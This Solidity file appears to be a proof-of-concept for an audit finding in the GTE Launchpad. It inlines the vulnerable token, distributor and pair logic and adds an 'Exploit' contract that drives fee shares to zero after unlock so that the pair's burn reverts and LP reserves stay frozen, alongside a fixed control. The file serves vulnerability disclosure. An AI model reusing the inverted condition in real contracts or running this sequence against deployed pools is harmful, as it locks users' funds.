// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of GTE Launchpad finding 64855 (H-07):
// "Total reward shares for token can reach zero after unlocking, bricking the
//  GTELaunchpadV2Pair."
//
// ROOT CAUSE (verbatim, LaunchToken.sol:147):
//   if (totalFeeShare == 0 && !unlocked) _endRewards();
// The `!unlocked` is inverted. It should be `unlocked`. Because of this, when
// every bonding fee-share holder transfers their launch tokens away AFTER the
// token is unlocked, `totalFeeShare` reaches 0 but `_endRewards()` is SKIPPED
// (the pool is never deactivated on the pair). Meanwhile the Distributor's
// `totalShares` for that launch asset reaches 0.
//
// REVERT SITE (verbatim, Distributor.sol:119):
//   if (rs.totalShares == 0) revert NoSharesToIncentivize();
// Now any pair operation that routes through `_update` and still has non-zero
// accrued launchpad fees calls Distributor.addRewards, which reverts. burn(),
// mint() and swap() all route through `_update`, so the pair is permanently
// bricked: LPs can no longer withdraw their reserves.
//
// This file inlines the real vulnerable logic (LaunchToken share bookkeeping,
// the Distributor totalShares guard, and the pair's `_update` fee-distribution
// branch) and models only the opaque plumbing (a minimal ERC20, a minimal LP
// pair) as faithful doubles. The vulnerable boundary itself is NOT mocked.
// ─────────────────────────────────────────────────────────────────────────────

/*▄▀ INTERFACES ▄▀*/

interface IERC20Like {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface ILaunchpad {
    function increaseStake(address account, uint96 shares) external;
    function decreaseStake(address account, uint96 shares) external;
    function endRewards() external;
}

interface IDistributor {
    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external;
}

interface IGTELaunchpadV2Pair {
    function endRewardsAccrual() external;
}

interface ILaunchTokenLike {
    function unlock() external;
    function mint(uint256 amount) external;
}

/*▄▀ MINIMAL ERC20 BASE (models Solady ERC20's transfer + _beforeTokenTransfer hook) ▄▀*/

abstract contract ERC20Min {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        _beforeTokenTransfer(from, to, amount);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }

    function _mint(address to, uint256 amount) internal {
        _beforeTokenTransfer(address(0), to, amount);
        totalSupply += amount;
        balanceOf[to] += amount;
    }
}

/// @dev Opaque reserve-token double (the pair's quote asset) + harm MARKER token.
contract MiniToken is ERC20Min {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/*▄▀ VULNERABLE CONTRACT: LaunchToken (verbatim buggy condition inlined) ▄▀*/

// The real LaunchToken extends Solady's ERC20; the fee-share bookkeeping and the
// `_beforeTokenTransfer` hook below are inlined VERBATIM from the audited source
// (contracts/launchpad/LaunchToken.sol @ code4rena 2025-08-gte-perps).
contract LaunchToken is ERC20Min {
    string public name;
    string public symbol;

    address public immutable launchpad;
    address public immutable gteRouter;

    bool public unlocked;
    uint256 public eventNonce;
    uint256 public totalFeeShare;
    mapping(address => uint256) public bondingShare;

    constructor(string memory _name, string memory _symbol, address gteRouter_) {
        name = _name;
        symbol = _symbol;
        gteRouter = gteRouter_;
        launchpad = msg.sender;
    }

    modifier onlyLaunchpad() {
        if (msg.sender != launchpad) revert("BadAuth");
        _;
    }

    function unlock() external onlyLaunchpad {
        unlocked = true;
    }

    function mint(uint256 amount) external onlyLaunchpad {
        _mint(launchpad, amount);
    }

    // ─── VERBATIM from LaunchToken.sol ───────────────────────────────────────
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
        if (!unlocked && from != launchpad && to != launchpad && to != gteRouter) {
            revert("TransfersDisabledWhileBonding");
        }

        if (!unlocked) {
            if (from != launchpad && to != launchpad && to != gteRouter) revert("TransfersDisabledWhileBonding");

            if (from == launchpad && to != launchpad) _increaseFeeShares(to, amount);
            else if (to != launchpad && to != gteRouter) revert("TransfersDisabledWhileBonding");
        }

        if (from != launchpad) _decreaseFeeShares(from, amount);
    }

    function _increaseFeeShares(address account, uint256 amount) internal {
        if (amount == 0 || account == address(0)) return;

        unchecked {
            totalFeeShare += amount;
            bondingShare[account] += amount;
        }

        ILaunchpad(launchpad).increaseStake(account, uint96(amount));
    }

    function _decreaseFeeShares(address account, uint256 amount) internal {
        uint256 share = bondingShare[account];
        if (share == 0 || account == address(0)) return;

        amount = amount > share ? share : amount;

        unchecked {
            totalFeeShare -= amount;
            bondingShare[account] -= amount;
        }

        if (totalFeeShare == 0 && !unlocked) _endRewards(); // @> BUG: `!unlocked` is inverted; after unlock this is SKIPPED, leaving the pair's rewards pool active with zero shares

        ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
    }

    /// @dev Hook to end rewards program for this base token if no more pre-bonding shares exist
    function _endRewards() internal {
        ILaunchpad(launchpad).endRewards();
    }
}

/*▄▀ FIXED VARIANT: identical except line 147 uses `&& unlocked` (negative control) ▄▀*/

contract LaunchTokenFixed is ERC20Min {
    string public name;
    string public symbol;

    address public immutable launchpad;
    address public immutable gteRouter;

    bool public unlocked;
    uint256 public totalFeeShare;
    mapping(address => uint256) public bondingShare;

    constructor(string memory _name, string memory _symbol, address gteRouter_) {
        name = _name;
        symbol = _symbol;
        gteRouter = gteRouter_;
        launchpad = msg.sender;
    }

    modifier onlyLaunchpad() {
        if (msg.sender != launchpad) revert("BadAuth");
        _;
    }

    function unlock() external onlyLaunchpad {
        unlocked = true;
    }

    function mint(uint256 amount) external onlyLaunchpad {
        _mint(launchpad, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
        if (!unlocked && from != launchpad && to != launchpad && to != gteRouter) {
            revert("TransfersDisabledWhileBonding");
        }

        if (!unlocked) {
            if (from != launchpad && to != launchpad && to != gteRouter) revert("TransfersDisabledWhileBonding");
            if (from == launchpad && to != launchpad) _increaseFeeShares(to, amount);
            else if (to != launchpad && to != gteRouter) revert("TransfersDisabledWhileBonding");
        }

        if (from != launchpad) _decreaseFeeShares(from, amount);
    }

    function _increaseFeeShares(address account, uint256 amount) internal {
        if (amount == 0 || account == address(0)) return;
        unchecked {
            totalFeeShare += amount;
            bondingShare[account] += amount;
        }
        ILaunchpad(launchpad).increaseStake(account, uint96(amount));
    }

    function _decreaseFeeShares(address account, uint256 amount) internal {
        uint256 share = bondingShare[account];
        if (share == 0 || account == address(0)) return;
        amount = amount > share ? share : amount;
        unchecked {
            totalFeeShare -= amount;
            bondingShare[account] -= amount;
        }

        if (totalFeeShare == 0 && unlocked) _endRewards(); // FIX: end rewards post-unlock when the last shares leave

        ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
    }

    function _endRewards() internal {
        ILaunchpad(launchpad).endRewards();
    }
}

/*▄▀ VULNERABLE CONTRACT: Distributor (verbatim totalShares guard inlined) ▄▀*/

// Faithful reduction of contracts/launchpad/Distributor.sol. The real Distributor
// stores a per-launch-asset RewardPoolData in EIP-1967 slots; here we keep the
// same struct with `totalShares` + `quoteAsset` in a mapping keyed by launch
// asset. increaseStake/decreaseStake mirror `rs.stake`/`rs.unstake`'s
// `totalShares += / -=`, and addRewards' guard is inlined VERBATIM.
contract Distributor is IDistributor {
    struct RewardPoolData {
        uint96 totalShares;
        address quoteAsset;
    }

    error NoSharesToIncentivize();
    error RewardsDoNotExist();

    address public launchpad;
    mapping(address => RewardPoolData) internal pools;

    function initialize(address _launchpad) external {
        launchpad = _launchpad;
    }

    modifier onlyLaunchpad() {
        if (msg.sender != launchpad) revert("Unauthorized");
        _;
    }

    function sharesOf(address launchAsset) external view returns (uint256) {
        return pools[launchAsset].totalShares;
    }

    function createRewardsPair(address launchAsset, address quoteAsset) external onlyLaunchpad {
        pools[launchAsset].quoteAsset = quoteAsset;
    }

    // Mirrors Distributor.increaseStake -> rs.stake -> `self.totalShares += newShares`.
    function increaseStake(address launchAsset, address, uint96 shares) external onlyLaunchpad {
        pools[launchAsset].totalShares += shares;
    }

    // Mirrors Distributor.decreaseStake -> rs.unstake -> `self.totalShares -= removeShares`.
    function decreaseStake(address launchAsset, address, uint96 shares) external onlyLaunchpad {
        pools[launchAsset].totalShares -= shares;
    }

    function endRewards(IGTELaunchpadV2Pair pair) external onlyLaunchpad {
        pair.endRewardsAccrual();
    }

    // ─── VERBATIM guard from Distributor.sol:119 ─────────────────────────────
    function addRewards(address token0, address token1, uint128, uint128) external {
        RewardPoolData storage rs = pools[token0];

        if (rs.quoteAsset == address(0)) {
            rs = pools[token1];
            if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
        }

        if (rs.totalShares == 0) revert NoSharesToIncentivize(); // @> reverting guard: with zero shares, any fee distribution from the pair reverts here, bricking the pair

        // (reward-pool bookkeeping + safeTransferFrom pulls omitted — the harm
        //  path reverts at the guard above before any transfer executes)
    }
}

/*▄▀ VULNERABLE CONTRACT: Launchpad (forwards increaseStake/decreaseStake/endRewards) ▄▀*/

// Faithful reduction of contracts/launchpad/Launchpad.sol's fee-sharing forwarders.
contract Launchpad {
    Distributor public distributor;
    mapping(address => bool) public isLaunchAsset;
    mapping(address => address) public pairOf; // launchAsset => pair

    constructor(Distributor _distributor) {
        distributor = _distributor;
    }

    modifier onlyLaunchAsset() {
        if (!isLaunchAsset[msg.sender]) revert("NotLaunchAsset");
        _;
    }

    /// @dev Deploys the LaunchToken so that `LaunchToken.launchpad == address(this)` (msg.sender).
    function createLaunch(bool useFixed) external returns (address token) {
        if (useFixed) token = address(new LaunchTokenFixed("Launch", "LNCH", address(0)));
        else token = address(new LaunchToken("Launch", "LNCH", address(0)));
        isLaunchAsset[token] = true;
    }

    function mintSupply(address token, uint256 amount) external {
        ILaunchTokenLike(token).mint(amount); // mints to launchpad (onlyLaunchpad)
    }

    function createPair(address launchAsset, address quote, address launchpadLp)
        external
        returns (address pair)
    {
        GTELaunchpadV2Pair p = new GTELaunchpadV2Pair();
        p.initialize(launchAsset, quote, launchpadLp, address(distributor));
        pairOf[launchAsset] = address(p);
        distributor.createRewardsPair(launchAsset, quote);
        return address(p);
    }

    function bondTo(address token, address to, uint256 amount) external {
        // launchpad -> staker transfer while bonding => _increaseFeeShares(to)
        IERC20Like(token).transfer(to, amount);
    }

    function seedReserves(address token, address pair, uint256 amount) external {
        IERC20Like(token).transfer(pair, amount);
    }

    function unlockToken(address token) external {
        ILaunchTokenLike(token).unlock();
    }

    // ─── VERBATIM forwarders from Launchpad.sol ──────────────────────────────
    function increaseStake(address account, uint96 shares) external onlyLaunchAsset {
        distributor.increaseStake(msg.sender, account, shares);
    }

    function decreaseStake(address account, uint96 shares) external onlyLaunchAsset {
        distributor.decreaseStake(msg.sender, account, shares);
    }

    function endRewards() external onlyLaunchAsset {
        IGTELaunchpadV2Pair pair = IGTELaunchpadV2Pair(pairOf[msg.sender]);
        distributor.endRewards(pair);
    }
}

/*▄▀ VULNERABLE CONTRACT: GTELaunchpadV2Pair (verbatim _update distribution branch) ▄▀*/

// Faithful reduction of contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol.
// The `_update` fee-distribution branch, `_distributeLaunchpadFees`, and
// `endRewardsAccrual` are inlined VERBATIM (the price-accumulator plumbing, which
// is not part of the finding, is omitted). burn()/mint()/swap() route through
// `_update`, exactly as in the real pair.
contract GTELaunchpadV2Pair is IGTELaunchpadV2Pair {
    uint256 public constant REWARDS_FEE_SHARE = 1;
    uint256 public constant MINIMUM_LIQUIDITY = 10 ** 3;

    address public launchpadLp;
    address public launchpadFeeDistributor;
    address public factory;
    address public token0;
    address public token1;

    uint112 private reserve0;
    uint112 private reserve1;
    uint32 private blockTimestampLast;

    uint112 public accruedLaunchpadFee0;
    uint112 public accruedLaunchpadFee1;

    uint256 public rewardsPoolActive = 1;

    // Pair's own LP token accounting (UniswapV2ERC20 subset)
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor() {
        factory = msg.sender;
    }

    function initialize(address _token0, address _token1, address _launchpadLp, address _launchpadFeeDistributor)
        external
    {
        token0 = _token0;
        token1 = _token1;
        launchpadLp = _launchpadLp;
        launchpadFeeDistributor = _launchpadFeeDistributor;
        rewardsPoolActive = 1;
    }

    function getReserves() public view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, blockTimestampLast);
    }

    function transferLp(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }

    function _mintLp(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function _burnLp(address from, uint256 amount) internal {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    // ─── VERBATIM from GTELaunchpadV2Pair.sol ────────────────────────────────
    function endRewardsAccrual() external {
        if (msg.sender != launchpadFeeDistributor) revert("GTEUniV2: FORBIDDEN");

        // There are no more shares, so prevent distribution and accrual of any remaining rewards
        delete accruedLaunchpadFee0;
        delete accruedLaunchpadFee1;
        delete rewardsPoolActive;

        _update(
            IERC20Like(token0).balanceOf(address(this)),
            IERC20Like(token1).balanceOf(address(this)),
            reserve0,
            reserve1,
            uint112(0),
            uint112(0)
        );
    }

    // ─── VERBATIM fee-distribution branch from GTELaunchpadV2Pair._update ─────
    function _update(
        uint256 balance0,
        uint256 balance1,
        uint112 _reserve0,
        uint112 _reserve1,
        uint112 newLaunchpadFee0,
        uint112 newLaunchpadFee1
    ) private {
        if (balance0 > type(uint112).max || balance1 > type(uint112).max) revert("UniswapV2: OVERFLOW");

        // New accrued fees must AT LEAST equal existing undistributed fees so that the Sync can be accurate
        uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
        uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;

        uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);
        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired
        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
            // (price accumulators omitted — not part of the finding)
            if (launchpadFeeDistributor > address(0)) {
                if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                    delete accruedLaunchpadFee0;
                    delete accruedLaunchpadFee1;
                    _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
                }
            }
        } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
            accruedLaunchpadFee0 = totalLaunchpadFee0;
            accruedLaunchpadFee1 = totalLaunchpadFee1;
        }

        // Balances contain both accrued and new launchpad fees earned this tx
        reserve0 = _reserve0 = uint112(balance0) - totalLaunchpadFee0;
        reserve1 = _reserve1 = uint112(balance1) - totalLaunchpadFee1;

        blockTimestampLast = blockTimestamp;
    }

    // ─── VERBATIM from GTELaunchpadV2Pair.sol ────────────────────────────────
    function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
        if ((fee0 | fee1) > 0) {
            address _token0 = token0;
            address _token1 = token1;
            address distributor = launchpadFeeDistributor;

            if (fee0 > 0) IERC20Like(_token0).approve(distributor, uint256(fee0));
            if (fee1 > 0) IERC20Like(_token1).approve(distributor, uint256(fee1));

            IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));
        }
    }

    // Seed initial liquidity: reads deposited balances, mints LP, routes through _update.
    function mint(address to) external returns (uint256 liquidity) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves();
        uint256 balance0 = IERC20Like(token0).balanceOf(address(this));
        uint256 balance1 = IERC20Like(token1).balanceOf(address(this));
        uint256 amount0 = balance0 - _reserve0;
        uint256 amount1 = balance1 - _reserve1;

        uint256 _totalSupply = totalSupply;
        if (_totalSupply == 0) {
            liquidity = _sqrt(amount0 * amount1) - MINIMUM_LIQUIDITY;
            _mintLp(address(0), MINIMUM_LIQUIDITY);
        } else {
            liquidity = _min(amount0 * _totalSupply / _reserve0, amount1 * _totalSupply / _reserve1);
        }
        require(liquidity > 0, "UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED");
        _mintLp(to, liquidity);

        _update(balance0, balance1, _reserve0, _reserve1, uint112(0), uint112(0));
    }

    // A launchpad-fee-generating swap: `fee0` of the swap accrues as the launchpad's
    // fee share. Routes through _update exactly like the real swap(); when called in
    // the same block as mint (timeElapsed == 0) it ACCRUES rather than distributes.
    function swap(uint112 fee0) external {
        uint256 balance0 = IERC20Like(token0).balanceOf(address(this));
        uint256 balance1 = IERC20Like(token1).balanceOf(address(this));
        (uint112 launchpadFee0, uint112 launchpadFee1) =
            launchpadFeeDistributor > address(0) && rewardsPoolActive > 0 ? (fee0, uint112(0)) : (uint112(0), uint112(0));
        _update(balance0, balance1, reserve0, reserve1, launchpadFee0, launchpadFee1);
    }

    // Withdraw liquidity: burns the LP sent to the pair, returns reserves, routes
    // through _update. When totalShares==0 and accrued fees remain, _update reverts.
    function burn(address to) external returns (uint256 amount0, uint256 amount1) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves();
        address _token0 = token0;
        address _token1 = token1;
        uint256 balance0 = IERC20Like(_token0).balanceOf(address(this));
        uint256 balance1 = IERC20Like(_token1).balanceOf(address(this));
        uint256 liquidity = balanceOf[address(this)];

        uint256 _totalSupply = totalSupply;
        amount0 = liquidity * balance0 / _totalSupply;
        amount1 = liquidity * balance1 / _totalSupply;
        require(amount0 > 0 && amount1 > 0, "UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED");
        _burnLp(address(this), liquidity);
        IERC20Like(_token0).transfer(to, amount0);
        IERC20Like(_token1).transfer(to, amount1);
        balance0 = IERC20Like(_token0).balanceOf(address(this));
        balance1 = IERC20Like(_token1).balanceOf(address(this));

        _update(balance0, balance1, _reserve0, _reserve1, uint112(0), uint112(0));
    }

    function _sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

/*▄▀ SCENARIO BASE: builds the full protocol + drives bonding/unlock/seed/accrue ▄▀*/

abstract contract Scenario {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 internal constant BOND_AMOUNT = 100 ether; // staker's bonding fee-share
    uint256 internal constant RESERVE0 = 1000 ether; // launch-token reserve in the pair
    uint256 internal constant RESERVE1 = 1000 ether; // quote-token reserve in the pair
    uint112 internal constant FEE0 = 1 ether; // accrued launchpad fee at freeze time

    // deployed components
    MiniToken public quote;
    Distributor public distributor;
    Launchpad public launchpad;
    address public launchToken; // token0 of the pair (the launch asset)
    GTELaunchpadV2Pair public pair;
    MiniToken public marker;

    // results
    bool public burnReverted;
    uint256 public lockedReserves;
    uint256 public sinkMarkerBalance;
    uint256 public lpWithdrawn0;
    uint256 public lpWithdrawn1;

    function _build(bool useFixed) internal {
        // 1) opaque quote reserve token
        quote = new MiniToken("Quote", "QUOTE");
        // 2) distributor
        distributor = new Distributor();
        // 3) launchpad (owns the distributor)
        launchpad = new Launchpad(distributor);
        distributor.initialize(address(launchpad));
        // 4) launch token (deployed BY the launchpad so launchToken.launchpad == launchpad)
        launchToken = launchpad.createLaunch(useFixed);
        launchpad.mintSupply(launchToken, 5000 ether); // minted to the launchpad
        // 5) the reward pair (launchToken/quote)
        pair = GTELaunchpadV2Pair(launchpad.createPair(launchToken, address(quote), address(launchpad)));
        // 6) harm MARKER token (LAST)
        marker = new MiniToken("LOCKED-LP", "LOCKED-LP");

        // --- BONDING (while !unlocked): launchpad -> this contract, mints fee-shares ---
        launchpad.bondTo(launchToken, address(this), BOND_AMOUNT);
        require(distributor.sharesOf(launchToken) == BOND_AMOUNT, "shares not bonded");

        // --- UNLOCK ---
        launchpad.unlockToken(launchToken);

        // --- SEED LP RESERVES (after unlock, from launchpad => no fee-share churn) ---
        launchpad.seedReserves(launchToken, address(pair), RESERVE0); // launch-token side (from launchpad)
        quote.mint(address(pair), RESERVE1); // opaque quote side minted directly into the pair
        pair.mint(address(this)); // this contract becomes the sole LP; sets reserves + blockTimestampLast

        // --- ACCRUE LAUNCHPAD FEES (same block => accrues, not distributes) ---
        pair.swap(FEE0);
        require(pair.accruedLaunchpadFee0() == FEE0, "fees not accrued");
    }

    /// @dev Phase 4: the sole fee-share holder transfers all launch tokens away.
    ///      Drives Distributor.totalShares -> 0. For the buggy token, _endRewards
    ///      is SKIPPED (unlocked==true); for the fixed token it fires.
    function dumpShares() public {
        uint256 bal = IERC20Like(launchToken).balanceOf(address(this));
        IERC20Like(launchToken).transfer(DEAD, bal);
    }

    /// @dev Phase 5 prep: LP holder sends its LP to the pair to withdraw.
    function sendLpToPair() public {
        uint256 lp = pair.balanceOf(address(this));
        pair.transferLp(address(pair), lp);
    }

    /// @dev Raw burn (no catch) — for precise revert-selector assertions.
    function callBurn() external returns (uint256, uint256) {
        return pair.burn(address(this));
    }

    function currentShares() external view returns (uint256) {
        return distributor.sharesOf(launchToken);
    }
}

/*▄▀ EXPLOIT (buggy): proves the pair is bricked and LP funds are frozen ▄▀*/

contract Exploit is Scenario {
    constructor() {
        _build(false); // buggy LaunchToken
    }

    /// @notice Full harm sequence. MUST be called at a later block than deployment
    ///         (the pair's `_update` distribution branch requires timeElapsed > 0).
    function run() external {
        dumpShares(); // totalShares -> 0, _endRewards SKIPPED (unlocked)
        require(distributor.sharesOf(launchToken) == 0, "shares should be zero");

        sendLpToPair();

        // frozen LP reserves = the token0 + token1 the LP can no longer withdraw
        uint256 frozen =
            IERC20Like(launchToken).balanceOf(address(pair)) + quote.balanceOf(address(pair));

        try this.callBurn() returns (uint256, uint256) {
            burnReverted = false;
        } catch {
            burnReverted = true;
        }
        require(burnReverted, "pair not bricked - burn succeeded");

        lockedReserves = frozen;
        marker.mint(SINK, frozen); // record harm magnitude at the SINK
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}

/*▄▀ EXPLOIT CONTROL (fixed): the same sequence but burn SUCCEEDS ▄▀*/

contract ExploitControl is Scenario {
    constructor() {
        _build(true); // fixed LaunchTokenFixed
    }

    /// @notice With the fix, dumping shares fires _endRewards -> endRewardsAccrual,
    ///         deactivating the pool so the subsequent burn distributes nothing and
    ///         the LP successfully withdraws its reserves.
    function run() external {
        dumpShares(); // totalShares -> 0, _endRewards FIRES (unlocked)
        require(distributor.sharesOf(launchToken) == 0, "shares should be zero");
        require(pair.rewardsPoolActive() == 0, "pool not deactivated by fix");

        sendLpToPair();
        (uint256 a0, uint256 a1) = pair.burn(address(this));
        lpWithdrawn0 = a0;
        lpWithdrawn1 = a1;
        require(a0 > 0 && a1 > 0, "control: burn failed");
    }
}
